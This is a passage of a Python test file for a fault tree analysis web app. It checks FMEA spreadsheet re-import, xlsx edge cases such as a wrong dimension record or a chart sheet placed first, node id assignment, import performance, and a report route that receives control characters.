              "v1.csv", columns=["ID", "Mode", "Cause"])
    assert pump["name"] == "Pump – Leak (rev B)"
    assert "cause" not in pump["fmea"] and pump["fmea"]["item"] == "Pump"
    # A new severity alone: RPN follows S x O x D of the node's ranks.
    _reimport(tree, [["F-1", 9]], {"id": "ID", "severity": "S"}, "v1.csv", columns=["ID", "S"])
    assert pump["fmea"]["severity"] == 9 and pump["fmea"]["rpn"] == 9 * 3 * 4


def test_fmea_reimport_reports_rows_no_longer_in_the_sheet():
    """Nodes of an earlier import of the sheet whose rows are gone are kept,
    and listed -- not silently left behind."""
    from fta_web import fmea_import

    tree = _imported_tree()
    _reimport(tree, [["X-1", "Pipe", "Burst"]], {"id": "ID", "item": "Item", "mode": "Mode"},
              "other.csv", columns=["ID", "Item", "Mode"])
    # v2 of the sheet (renamed file): F-2 removed, F-3 present but invalid, F-4 new.
    result = _reimport(tree, [["F-1", "Pump", "Leak", "Seal wear", 8, 3, 4, 1e-6],
                              ["F-3", "Fan", "Noise", "Bearing", 11, 4, 4, 3e-6],
                              ["F-4", "Hose", "Crack", "Age", 6, 2, 3, 1e-7]],
                       FULL_MAPPING, "v2.csv")
    assert [s["reason"] for s in result["skipped"]] == ["invalidRank"]
    assert result["notInSheet"] == [{"id": "root_1", "name": "Valve – Stuck", "fmeaId": "F-2"}]
    ids = [n["id"] for n in tree["children"]]
    assert "root_1" in ids and len(ids) == 5  # nothing deleted; X-1 not reported
    assert fmea_import.apply_import(  # a first import has nothing to report
        {"id": "root", "name": "T", "children": []}, [["A", "M"]], {"id": "ID", "mode": "Mode"},
        "root", {}, "new.csv", columns=["ID", "Mode"])["notInSheet"] == []


def test_fmea_import_route_returns_not_in_sheet(tmp_path):
    import flask

    from fta_web.routes.fmea import fmea_bp
    from fta_web.routes.tree import tree_bp
    from fta_web.state import get_state, reset_state

    sheet = tmp_path / "f.csv"
    sheet.write_text("ID,Mode\nA,Leak\nB,Stuck\n", encoding="utf-8")
    reset_state()
    app = flask.Flask(__name__)
    app.register_blueprint(tree_bp)
    app.register_blueprint(fmea_bp)
    get_state().fs_root = tmp_path
    body = {"path": "f.csv", "mapping": {"id": "ID", "mode": "Mode"}, "parentId": "root"}
    with app.test_client() as client:
        assert client.post("/api/fmea/import", json=body).get_json()["notInSheet"] == []
        sheet.write_text("ID,Mode\nA,Leak\n", encoding="utf-8")
        payload = client.post("/api/fmea/import", json=body).get_json()
    assert payload["notInSheet"] == [{"id": "root_1", "name": "Stuck", "fmeaId": "B"}]
    assert len(payload["tree"]["children"]) == 2


def test_fmea_tab_shows_the_rows_no_longer_in_the_sheet():
    """The FMEA tab says how many nodes of an earlier import are no longer
    in the sheet (and names them), in English and Japanese."""
    static = REPO / "fta_web" / "static" / "js"
    tab = (static / "tabs" / "fmea.js").read_text(encoding="utf-8")
    assert "res.notInSheet" in tab and "t('fmea.notInSheet'" in tab
    catalog = (static / "i18n" / "fmea.js").read_text(encoding="utf-8")
    en, ja = catalog.split("\n  ja:", 1)
    for part in (en, ja):
        line = next(ln for ln in part.splitlines() if "'fmea.notInSheet'" in ln)
        assert "{n}" in line and "{names}" in line


def _xlsx_with_dimension(path, ref):
    """A workbook whose sheet XML declares ``<dimension ref=ref/>``, as some
    exporters write it regardless of the data."""
    import re
    import zipfile

    openpyxl = pytest.importorskip("openpyxl")
    book = openpyxl.Workbook()
    sheet = book.active
    sheet.append(["ID", "Item", "Mode", "Rate"])
    sheet.append(["F-1", "Pump", "Leak", 1e-6])
    sheet.append([None, None, None, None])
    sheet.append(["F-2", "Valve", "Stuck", 2e-6])
    plain = path.with_suffix(".plain.xlsx")
    book.save(plain)
    with zipfile.ZipFile(plain) as zin, zipfile.ZipFile(path, "w") as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "xl/worksheets/sheet1.xml":
                data = re.sub(rb'<dimension ref="[^"]*"/>',
                              b'<dimension ref="%s"/>' % ref.encode(), data)
            zout.writestr(item, data)
    return path


def test_fmea_xlsx_with_a_wrong_dimension_record(tmp_path):
    """openpyxl's read-only mode trusts the sheet's declared dimension: with
    'A1' (written by some exporters) the table was just the 'ID' header --
    every row silently missing."""
    from fta_web import fmea_import

    path = _xlsx_with_dimension(tmp_path / "dim.xlsx", "A1")
    table = fmea_import.read_table(path)
    assert table["columns"] == ["ID", "Item", "Mode", "Rate"]
    assert table["rows"] == [["F-1", "Pump", "Leak", 1e-6], ["F-2", "Valve", "Stuck", 2e-6]]
    assert table["rowNumbers"] == [2, 4]


def _xlsx_with_a_chart_sheet_first(path):
    openpyxl = pytest.importorskip("openpyxl")
    from openpyxl.chart import BarChart, Reference

    book = openpyxl.Workbook()
    data = book.active
    data.title = "FMEA"
    data.append(["ID", "Mode", "Occurrence"])
    data.append(["A", "Leak", 4])
    chart = BarChart()
    chart.add_data(Reference(data, min_col=3, min_row=1, max_row=2), titles_from_data=True)
    book.create_chartsheet("Pareto", 0).add_chart(chart)
    book.save(path)
    return path


def test_fmea_xlsx_whose_first_sheet_is_a_chart(tmp_path):
    """The first sheet is the default, and a chart sheet has no cells:
    AttributeError ('Chartsheet' object has no attribute 'iter_rows') -- the
    preview was a 500 before the sheet list could even be shown."""
    from fta_web import fmea_import

    path = _xlsx_with_a_chart_sheet_first(tmp_path / "chart.xlsx")
    table = fmea_import.read_table(path)
    assert table["sheets"] == ["FMEA"] and table["sheet"] == "FMEA"
    assert table["rows"] == [["A", "Leak", 4]]
    with pytest.raises(fmea_import.FmeaImportError) as info:
        fmea_import.read_table(path, "Pareto")
    assert info.value.reason == "unknown_sheet"


def test_fmea_import_ids_are_the_desktop_ids():
    """Same ids as tree_ops.next_child_id gives one by one: past the highest
    sibling index, stepping over an id taken elsewhere in the tree."""
    from fta_web import fmea_import

    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": [
        {"id": "root_0", "name": "a", "probability": 0.1, "children": [
            {"id": "root_7", "name": "moved here", "probability": 0.1, "children": []}]},
        {"id": "root_5", "name": "b", "probability": 0.1, "children": []}]}
    rows = [["N%d" % i, "Mode%d" % i] for i in range(3)]
    result = fmea_import.apply_import(tree, rows, {"id": "ID", "mode": "Mode"}, "root", {}, "x",
                                      columns=["ID", "Mode"])
    assert result["created"] == ["root_6", "root_8", "root_9"]


def test_fmea_import_of_the_maximum_sheet_is_not_quadratic():
    """Each new row walked the whole tree twice (find the parent, collect
    every id): 20,000 rows -- the documented maximum -- took 81 s inside
    the state lock, freezing the whole app."""
    import time

    from fta_web import fmea_import

    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": []}
    rows = [["F-%d" % i, "Mode%d" % i, 1e-6] for i in range(fmea_import.MAX_ROWS)]
    started = time.perf_counter()
    result = fmea_import.apply_import(tree, rows, {"id": "ID", "mode": "Mode", "lambda": "Rate"},
                                      "root", {}, "x", columns=["ID", "Mode", "Rate"])
    elapsed = time.perf_counter() - started
    assert len(result["created"]) == fmea_import.MAX_ROWS
    assert result["created"][-1] == "root_%d" % (fmea_import.MAX_ROWS - 1)
    assert elapsed < 20.0, elapsed


def test_docx_route_with_control_characters(files_client, tmp_path):
    pytest.importorskip("docx")
    open_doc(files_client, write_doc(tmp_path / "c.json", control_char_tree(), title="T\x02"))
    response = files_client.post("/api/report/docx", json={})
    assert response.status_code == 200, response.get_data(as_text=True)[:300]
